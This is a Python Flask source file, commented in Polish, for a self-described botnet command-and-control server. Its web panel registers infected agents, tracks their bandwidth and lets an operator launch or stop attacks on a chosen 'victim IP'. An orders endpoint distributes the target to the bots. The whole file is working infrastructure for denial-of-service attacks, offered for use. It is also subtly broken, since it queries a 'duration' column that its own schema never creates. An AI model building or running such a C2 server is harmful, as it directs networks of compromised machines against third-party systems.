import os
import json
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from flask_cors import CORS
import psycopg2
from psycopg2.extras import RealDictCursor
import urllib.parse

app = Flask(__name__)
CORS(app)

# Pobierz URL bazy danych ze zmiennych środowiskowych
DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db():
    """Połączenie z bazą danych"""
    conn = psycopg2.connect(DATABASE_URL)
    conn.autocommit = True
    return conn

def init_db():
    """Inicjalizacja tabel"""
    conn = get_db()
    cur = conn.cursor()
    
    # Tabela agentów
    cur.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            platform TEXT,
            ip TEXT,
            bandwidth TEXT,
            status TEXT,
            attacking BOOLEAN DEFAULT FALSE,
            last_seen TIMESTAMP,
            registered TIMESTAMP
        )
    ''')
    
    # Tabela ataków
    cur.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id SERIAL PRIMARY KEY,
            target_ip TEXT,
            started TIMESTAMP,
            ended TIMESTAMP,
            status TEXT,
            threads INTEGER
        )
    ''')
    
    cur.close()
    conn.close()

# Inicjalizuj bazę przy starcie
init_db()

@app.route('/')
def index():
    """Panel webowy - PEŁNA WERSJA z agentami i historią"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Botnet C2 Panel</title>
        <meta charset="UTF-8">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #0a0e27;
                color: #fff;
            }
            .header {
                background: linear-gradient(90deg, #1a1f3a 0%, #2a2f4a 100%);
                padding: 20px;
                border-bottom: 2px solid #4a6fa5;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: #1a1f3a;
                padding: 20px;
                border-radius: 10px;
                border-left: 4px solid #4a6fa5;
            }
            .stat-card.total { border-left-color: #4a6fa5; }
            .stat-card.online { border-left-color: #2ecc71; }
            .stat-card.attack { border-left-color: #e74c3c; }
            .stat-card.power { border-left-color: #f39c12; }
            
            .stat-number {
                font-size: 36px;
                font-weight: bold;
                margin: 10px 0;
            }
            .stat-label {
                color: #8f9bb3;
                font-size: 14px;
                text-transform: uppercase;
            }
            .attack-panel {
                background: #1a1f3a;
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 30px;
            }
            input, select, button {
                background: #2a2f4a;
                border: 1px solid #3a3f5a;
                color: white;
                padding: 12px;
                margin: 5px;
                border-radius: 5px;
                font-size: 14px;
            }
            button {
                background: #4a6fa5;
                cursor: pointer;
                transition: all 0.3s;
                border: none;
            }
            button:hover {
                background: #5a7fb5;
                transform: translateY(-2px);
            }
            button.stop {
                background: #e74c3c;
            }
            button.stop:hover {
                background: #c0392b;
            }
            table {
                width: 100%;
                background: #1a1f3a;
                border-radius: 10px;
                overflow: hidden;
                margin-bottom: 30px;
            }
            th {
                background: #2a2f4a;
                padding: 15px;
                text-align: left;
            }
            td {
                padding: 15px;
                border-bottom: 1px solid #2a2f4a;
            }
            .online { color: #2ecc71; font-weight: bold; }
            .offline { color: #e74c3c; font-weight: bold; }
            .attacking { color: #f39c12; font-weight: bold; animation: pulse 1s infinite; }
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.5; }
                100% { opacity: 1; }
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>⚡ BOTNET CONTROL PANEL ⚡</h1>
            <p>Total bots: <span id="totalBots">0</span> | Online: <span id="onlineBots">0</span> | Total power: <span id="totalPower">0</span> Mbps</p>
        </div>
        
        <div class="container">
            <div class="stats-grid">
                <div class="stat-card total">
                    <div class="stat-label">Wszystkie boty</div>
                    <div class="stat-number" id="statTotal">0</div>
                </div>
                <div class="stat-card online">
                    <div class="stat-label">Online</div>
                    <div class="stat-number" id="statOnline">0</div>
                </div>
                <div class="stat-card attack">
                    <div class="stat-label">Atakujące</div>
                    <div class="stat-number" id="statAttacking">0</div>
                </div>
                <div class="stat-card power">
                    <div class="stat-label">Moc (Mbps)</div>
                    <div class="stat-number" id="statPower">0</div>
                </div>
            </div>
            
            <div class="attack-panel">
                <h2>🎯 NOWY ATAK</h2>
                <input type="text" id="targetIP" placeholder="IP ofiary (np. 192.168.1.100)">
                <input type="number" id="threads" placeholder="Wątki na bota" value="100">
                <input type="number" id="duration" placeholder="Czas (sekundy)" value="300">
                <button onclick="startAttack()">▶ ROZPOCZNIJ ATAK</button>
                <button class="stop" onclick="stopAttack()">⏹ ZATRZYMAJ ATAK</button>
            </div>
            
            <h2>🤖 AKTYWNI AGENCI</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID Agenta</th>
                        <th>Hostname</th>
                        <th>Platforma</th>
                        <th>IP publiczne</th>
                        <th>Przepustowość</th>
                        <th>Status</th>
                        <th>Atakuje</th>
                        <th>Ostatni kontakt</th>
                    </tr>
                </thead>
                <tbody id="agentsTable"></tbody>
            </table>
            
            <h2>📋 HISTORIA ATAKÓW</h2>
            <table>
                <thead>
                    <tr>
                        <th>Cel (IP)</th>
                        <th>Rozpoczęcie</th>
                        <th>Zakończenie</th>
                        <th>Status</th>
                        <th>Wątki</th>
                    </tr>
                </thead>
                <tbody id="historyTable"></tbody>
            </table>
        </div>
        
        <script>
            function loadStats() {
                fetch('/api/stats')
                    .then(r => r.json())
                    .then(data => {
                        // Update stat cards
                        document.getElementById('statTotal').textContent = data.total_bots;
                        document.getElementById('statOnline').textContent = data.online_bots;
                        document.getElementById('statAttacking').textContent = data.attacking_bots;
                        document.getElementById('statPower').textContent = data.total_power;
                        document.getElementById('totalBots').textContent = data.total_bots;
                        document.getElementById('onlineBots').textContent = data.online_bots;
                        document.getElementById('totalPower').textContent = data.total_power;
                    });
            }
            
            function loadAgents() {
                fetch('/api/agents')
                    .then(r => r.json())
                    .then(data => {
                        let html = '';
                        data.agents.forEach(agent => {
                            html += `<tr>
                                <td>${agent.id}</td>
                                <td>${agent.hostname}</td>
                                <td>${agent.platform}</td>
                                <td>${agent.ip}</td>
                                <td>${agent.bandwidth}</td>
                                <td class="${agent.status}">${agent.status}</td>
                                <td class="${agent.attacking ? 'attacking' : ''}">${agent.attacking ? '🔥 ATAKUJE' : '💤'}</td>
                                <td>${agent.last_seen}</td>
                            </tr>`;
                        });
                        document.getElementById('agentsTable').innerHTML = html;
                    });
            }
            
            function loadHistory() {
                fetch('/api/history')
                    .then(r => r.json())
                    .then(data => {
                        let html = '';
                        data.history.forEach(attack => {
                            html += `<tr>
                                <td>${attack.target_ip}</td>
                                <td>${attack.started}</td>
                                <td>${attack.ended || 'w trakcie'}</td>
                                <td>${attack.status}</td>
                                <td>${attack.threads}</td>
                            </tr>`;
                        });
                        document.getElementById('historyTable').innerHTML = html;
                    });
            }
            
            function startAttack() {
                const targetIP = document.getElementById('targetIP').value;
                const threads = document.getElementById('threads').value;
                const duration = document.getElementById('duration').value;
                
                if (!targetIP) {
                    alert('Podaj IP ofiary!');
                    return;
                }
                
                fetch('/api/attack/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target_ip: targetIP,
                        threads: parseInt(threads),
                        duration: parseInt(duration)
                    })
                })
                .then(() => {
                    loadStats();
                    loadHistory();
                });
            }
            
            function stopAttack() {
                fetch('/api/attack/stop', {method: 'POST'})
                .then(() => {
                    loadStats();
                    loadHistory();
                });
            }
            
            // Update co 2 sekundy
            setInterval(() => {
                loadStats();
                loadAgents();
                loadHistory();
            }, 2000);
            
            // Pierwsze załadowanie
            loadStats();
            loadAgents();
            loadHistory();
        </script>
    </body>
    </html>
    '''

@app.route('/api/register', methods=['POST'])
def register():
    """Rejestracja agenta"""
    data = request.json
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        INSERT INTO agents (id, hostname, platform, ip, bandwidth, status, last_seen, registered)
        VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
        ON CONFLICT (id) DO UPDATE SET
            hostname = EXCLUDED.hostname,
            platform = EXCLUDED.platform,
            ip = EXCLUDED.ip,
            status = EXCLUDED.status,
            last_seen = EXCLUDED.last_seen
    ''', (
        data['id'], data['hostname'], data['platform'], data['ip'],
        data.get('bandwidth', '100Mbps'), 'online', datetime.now(), datetime.now()
    ))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'registered'})

@app.route('/api/heartbeat/<agent_id>', methods=['POST'])
def heartbeat(agent_id):
    """Heartbeat od agenta"""
    data = request.json
    attacking = data.get('attacking', False)
    
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        UPDATE agents 
        SET last_seen = %s, status = 'online', attacking = %s
        WHERE id = %s
    ''', (datetime.now(), attacking, agent_id))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/orders/<agent_id>')
def get_orders(agent_id):
    """Pobierz rozkazy dla agenta"""
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        SELECT target_ip, threads, duration FROM attacks 
        WHERE status = 'active' 
        ORDER BY started DESC LIMIT 1
    ''')
    
    attack = cur.fetchone()
    cur.close()
    conn.close()
    
    if attack:
        return jsonify({
            'target_ip': attack[0],
            'threads': attack[1],
            'duration': attack[2]
        })
    else:
        return jsonify({'stop': True})

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    """Rozpocznij atak"""
    data = request.json
    conn = get_db()
    cur = conn.cursor()
    
    # Zakończ poprzednie ataki
    cur.execute('''
        UPDATE attacks SET status = 'stopped', ended = %s
        WHERE status = 'active'
    ''', (datetime.now(),))
    
    # Nowy atak
    cur.execute('''
        INSERT INTO attacks (target_ip, started, status, threads)
        VALUES (%s, %s, %s, %s)
    ''', (data['target_ip'], datetime.now(), 'active', data.get('threads', 100)))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'attack_started'})

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """Zatrzymaj atak"""
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        UPDATE attacks SET status = 'stopped', ended = %s
        WHERE status = 'active'
    ''', (datetime.now(),))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'attack_stopped'})

@app.route('/api/agents')
def get_agents():
    """Pobierz listę agentów"""
    conn = get_db()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    
    cur.execute('''
        SELECT id, hostname, platform, ip, bandwidth, status, attacking, 
               TO_CHAR(last_seen, 'HH24:MI:SS') as last_seen
        FROM agents 
        ORDER BY last_seen DESC
    ''')
    
    agents = cur.fetchall()
    cur.close()
    conn.close()
    
    return jsonify({'agents': agents})

@app.route('/api/history')
def get_history():
    """Pobierz historię ataków"""
    conn = get_db()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    
    cur.execute('''
        SELECT target_ip, 
               TO_CHAR(started, 'HH24:MI:SS') as started,
               TO_CHAR(ended, 'HH24:MI:SS') as ended,
               status, threads
        FROM attacks 
        ORDER BY started DESC 
        LIMIT 20
    ''')
    
    history = cur.fetchall()
    cur.close()
    conn.close()
    
    return jsonify({'history': history})

@app.route('/api/stats')
def get_stats():
    """Statystyki"""
    conn = get_db()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    
    # Wszyscy agenci
    cur.execute('SELECT COUNT(*) as count FROM agents')
    total_bots = cur.fetchone()['count']
    
    # Online (ostatnie 60 sekund)
    threshold = datetime.now() - timedelta(seconds=60)
    cur.execute('SELECT COUNT(*) as count FROM agents WHERE last_seen > %s', (threshold,))
    online_bots = cur.fetchone()['count']
    
    # Atakujący
    cur.execute('SELECT COUNT(*) as count FROM agents WHERE last_seen > %s AND attacking = TRUE', (threshold,))
    attacking_bots = cur.fetchone()['count']
    
    cur.close()
    conn.close()
    
    return jsonify({
        'total_bots': total_bots,
        'online_bots': online_bots,
        'attacking_bots': attacking_bots,
        'total_power': attacking_bots * 100
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
